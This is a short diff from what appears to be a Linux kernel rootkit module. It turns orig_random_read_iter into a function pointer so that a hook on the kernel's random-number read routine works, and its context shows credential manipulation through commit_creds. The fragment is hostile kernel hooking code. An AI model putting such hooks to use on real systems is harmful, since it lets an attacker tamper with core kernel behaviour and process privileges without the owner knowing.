@@ -128,7 +128,7 @@ void del_root(void)
     commit_creds(user);
 }
 
-static asmlinkage ssize_t orig_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter);
+static asmlinkage ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
 
 static asmlinkage ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter) {
   return iter->count;
